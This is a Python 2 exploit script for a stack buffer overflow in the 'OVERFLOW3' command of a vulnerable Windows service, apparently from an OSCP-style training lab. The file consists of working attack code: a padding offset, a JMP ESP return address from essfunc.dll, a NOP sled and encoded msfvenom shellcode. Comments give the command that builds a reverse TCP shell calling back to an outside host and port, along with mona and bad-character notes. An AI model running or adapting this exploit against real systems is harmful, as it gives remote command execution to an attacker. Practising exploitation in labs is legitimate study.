#!/usr/bin/python2

import socket,sys

address = sys.argv[1]
port = int(sys.argv[2])

buffer='A'*1274

jmp_eip='\xaf\x11\x50\x62'
nops='\x90'*10
buf = ("\xfc\xbb\x2f\xe9\xcf\x09\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
"\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\xd3\x01\x4d\x09\x2b"
"\xd2\x32\x83\xce\xe3\x72\xf7\x9b\x54\x43\x73\xc9\x58\x28\xd1"
"\xf9\xeb\x5c\xfe\x0e\x5b\xea\xd8\x21\x5c\x47\x18\x20\xde\x9a"
"\x4d\x82\xdf\x54\x80\xc3\x18\x88\x69\x91\xf1\xc6\xdc\x05\x75"
"\x92\xdc\xae\xc5\x32\x65\x53\x9d\x35\x44\xc2\x95\x6f\x46\xe5"
"\x7a\x04\xcf\xfd\x9f\x21\x99\x76\x6b\xdd\x18\x5e\xa5\x1e\xb6"
"\x9f\x09\xed\xc6\xd8\xae\x0e\xbd\x10\xcd\xb3\xc6\xe7\xaf\x6f"
"\x42\xf3\x08\xfb\xf4\xdf\xa9\x28\x62\x94\xa6\x85\xe0\xf2\xaa"
"\x18\x24\x89\xd7\x91\xcb\x5d\x5e\xe1\xef\x79\x3a\xb1\x8e\xd8"
"\xe6\x14\xae\x3a\x49\xc8\x0a\x31\x64\x1d\x27\x18\xe1\xd2\x0a"
"\xa2\xf1\x7c\x1c\xd1\xc3\x23\xb6\x7d\x68\xab\x10\x7a\x8f\x86"
"\xe5\x14\x6e\x29\x16\x3d\xb5\x7d\x46\x55\x1c\xfe\x0d\xa5\xa1"
"\x2b\x81\xf5\x0d\x84\x62\xa5\xed\x74\x0b\xaf\xe1\xab\x2b\xd0"
"\x2b\xc4\xc6\x2b\xbc\xe1\x1e\x36\x32\x9e\x1c\x38\x5b\x02\xa8"
"\xde\x31\xaa\xfc\x49\xae\x53\xa5\x01\x4f\x9b\x73\x6c\x4f\x17"
"\x70\x91\x1e\xd0\xfd\x81\xf7\x10\x48\xfb\x5e\x2e\x66\x93\x3d"
"\xbd\xed\x63\x4b\xde\xb9\x34\x1c\x10\xb0\xd0\xb0\x0b\x6a\xc6"
"\x48\xcd\x55\x42\x97\x2e\x5b\x4b\x5a\x0a\x7f\x5b\xa2\x93\x3b"
"\x0f\x7a\xc2\x95\xf9\x3c\xbc\x57\x53\x97\x13\x3e\x33\x6e\x58"
"\x81\x45\x6f\xb5\x77\xa9\xde\x60\xce\xd6\xef\xe4\xc6\xaf\x0d"
"\x95\x29\x7a\x96\xa5\x63\x26\xbf\x2d\x2a\xb3\xfd\x33\xcd\x6e"
"\xc1\x4d\x4e\x9a\xba\xa9\x4e\xef\xbf\xf6\xc8\x1c\xb2\x67\xbd"
"\x22\x61\x87\x94\x22\x85\x77\x17")


#Now we need jmp esp next is to find module tha is vuln
#!mona modules will give this
#!mona find -s "\xff\xe4" -m essfunc.dll 
#so retuned address is need to be written in littile endian form ad eip
#0x625011af \xaf\x11\x50\x62
#and setting the bp at bp 0x625011af
#and now shellcode excepting \x00\x11\x40\x5f\xb8\xee
#msfvenom -p windows/shell_reverse_tcp LHOST=10.8.5.14 LPORT=1234 -b '\x00\x11\x40\x5f\xb8\xee' -f c

#offset value is 1274
#breakpoint is 1500
try:
	print '[+] Sending buffer'
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((address,port))
	s.recv(1024)			
	s.send('OVERFLOW3 ' + buffer + jmp_eip + nops + buf)
except:
 	print '[!] Unable to connect to the application.\n'
 	print 'Input Variable has been filled with the buffer '
 	sys.exit(0)
finally:
	s.close() 
#at this location we found the badcahr as we set our working dir
#!mona compare -f C:\logs\oscp\bytearray.bin -a 017CFA30
#foung bcr 00 11 12 40 41 5f 60 b8 b9 ee ff

#'\x00\x11\x40\x5f\xb8\xee'

#so we found the exact all the bad_char

